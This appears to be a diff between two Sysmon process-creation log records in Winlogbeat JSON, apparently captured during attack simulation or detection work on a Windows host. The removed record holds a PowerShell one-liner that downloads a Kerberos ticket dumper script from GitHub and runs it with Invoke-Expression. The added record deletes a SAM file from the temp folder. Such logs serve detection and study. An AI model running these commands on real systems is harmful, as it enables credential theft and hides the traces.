@@ -1,6 +1,6 @@
 {
   "@timestamp": [
-    "2025-09-09T14:54:49.269Z"
+    "2025-09-09T16:18:15.467Z"
   ],
   "agent.ephemeral_id": [
     "4aef2c92-921b-4e2e-93d9-8202e873e700"
@@ -33,10 +33,10 @@
     "1"
   ],
   "event.created": [
-    "2025-09-09T14:54:50.860Z"
+    "2025-09-09T16:18:17.992Z"
   ],
   "event.ingested": [
-    "2025-09-09T14:54:50.049Z"
+    "2025-09-09T16:18:17.979Z"
   ],
   "event.kind": [
     "event"
@@ -99,41 +99,42 @@
     "information"
   ],
   "message": [
-    "Process Create:\nRuleName: -\nUtcTime: 2025-09-09 14:54:49.269\nProcessGuid: {9602231E-3FB9-68C0-E501-000000003300}\nProcessId: 1256\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.19041.3996 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: \"powershell.exe\" & {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')}\nCurrentDirectory: C:\\Users\\KHAIRE~1\\AppData\\Local\\Temp\\\nUser: WINDOWS10\\khaireddine\nLogonGuid: {9602231E-2FD1-68C0-642E-020000000000}\nLogonId: 0x22e64\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6\nParentProcessGuid: {00000000-0000-0000-0000-000000000000}\nParentProcessId: 5872\nParentImage: -\nParentCommandLine: -\nParentUser: -"
+    "Process Create:\nRuleName: -\nUtcTime: 2025-09-09 16:18:15.467\nProcessGuid: {9602231E-5347-68C0-6F02-000000003300}\nProcessId: 7236\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.4355 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"cmd.exe\" /c del %%temp%%\\SAM >nul 2>&1\nCurrentDirectory: C:\\Users\\KHAIRE~1\\AppData\\Local\\Temp\\\nUser: WINDOWS10\\khaireddine\nLogonGuid: {9602231E-2FD1-68C0-642E-020000000000}\nLogonId: 0x22e64\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {00000000-0000-0000-0000-000000000000}\nParentProcessId: 5872\nParentImage: -\nParentCommandLine: -\nParentUser: -"
   ],
   "process.args": [
-    "powershell.exe",
-    "&",
-    "{Invoke-Expression",
-    "(New-Object",
-    "Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')}"
+    "cmd.exe",
+    "/c",
+    "del",
+    "%%temp%%\\SAM",
+    ">nul",
+    "2>&1"
   ],
   "process.args_count": [
-    5
+    6
   ],
   "process.command_line": [
-    "\"powershell.exe\" & {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')}"
+    "\"cmd.exe\" /c del %%temp%%\\SAM >nul 2>&1"
   ],
   "process.command_line.text": [
-    "\"powershell.exe\" & {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')}"
+    "\"cmd.exe\" /c del %%temp%%\\SAM >nul 2>&1"
   ],
   "process.entity_id": [
-    "{9602231E-3FB9-68C0-E501-000000003300}"
+    "{9602231E-5347-68C0-6F02-000000003300}"
   ],
   "process.executable": [
-    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    "C:\\Windows\\System32\\cmd.exe"
   ],
   "process.executable.text": [
-    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    "C:\\Windows\\System32\\cmd.exe"
   ],
   "process.hash.sha256": [
-    "9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
+    "badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0"
   ],
   "process.name": [
-    "powershell.exe"
+    "cmd.exe"
   ],
   "process.name.text": [
-    "powershell.exe"
+    "cmd.exe"
   ],
   "process.parent.pid": [
     5872
@@ -142,22 +143,22 @@
     "Microsoft Corporation"
   ],
   "process.pe.description": [
-    "Windows PowerShell"
+    "Windows Command Processor"
   ],
   "process.pe.file_version": [
-    "10.0.19041.3996 (WinBuild.160101.0800)"
+    "10.0.19041.4355 (WinBuild.160101.0800)"
   ],
   "process.pe.imphash": [
-    "3d08f4848535206d772de145804ff4b6"
+    "272245e2988e1e430500b852c4fb5e18"
   ],
   "process.pe.original_file_name": [
-    "PowerShell.EXE"
+    "Cmd.Exe"
   ],
   "process.pe.product": [
     "Microsoft® Windows® Operating System"
   ],
   "process.pid": [
-    1256
+    7236
   ],
   "process.working_directory": [
     "C:\\Users\\KHAIRE~1\\AppData\\Local\\Temp\\"
@@ -166,8 +167,8 @@
     "C:\\Users\\KHAIRE~1\\AppData\\Local\\Temp\\"
   ],
   "related.hash": [
-    "9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3",
-    "3d08f4848535206d772de145804ff4b6"
+    "badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0",
+    "272245e2988e1e430500b852c4fb5e18"
   ],
   "related.user": [
     "khaireddine"
@@ -194,10 +195,10 @@
     "Microsoft Corporation"
   ],
   "winlog.event_data.Description": [
-    "Windows PowerShell"
+    "Windows Command Processor"
   ],
   "winlog.event_data.FileVersion": [
-    "10.0.19041.3996 (WinBuild.160101.0800)"
+    "10.0.19041.4355 (WinBuild.160101.0800)"
   ],
   "winlog.event_data.IntegrityLevel": [
     "High"
@@ -233,7 +234,7 @@
     "Microsoft-Windows-Sysmon"
   ],
   "winlog.record_id": [
-    "466098"
+    "475228"
   ],
   "winlog.task": [
     "Process Create (rule: ProcessCreate)"
@@ -253,7 +254,7 @@
   "winlog.version": [
     5
   ],
-  "_id": "usT4LpkBoSoxSr8z7krX",
+  "_id": "f8RFL5kBoSoxSr8zWXoT",
   "_index": ".ds-winlogbeat-9.1.2-2025.08.17-000001",
   "_score": null
 }
